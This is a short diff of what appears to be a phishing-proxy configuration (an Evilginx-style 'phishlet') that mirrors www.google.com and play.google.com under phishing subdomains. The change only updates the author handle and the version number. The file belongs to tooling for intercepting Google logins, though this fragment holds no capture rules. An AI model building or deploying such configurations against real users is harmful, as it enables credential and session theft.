@@ -1,5 +1,5 @@
-author: '@hash3liZer'
-min_ver: '2.3.0'
+author: '@usher'
+min_ver: '3.0.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false,}
   - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
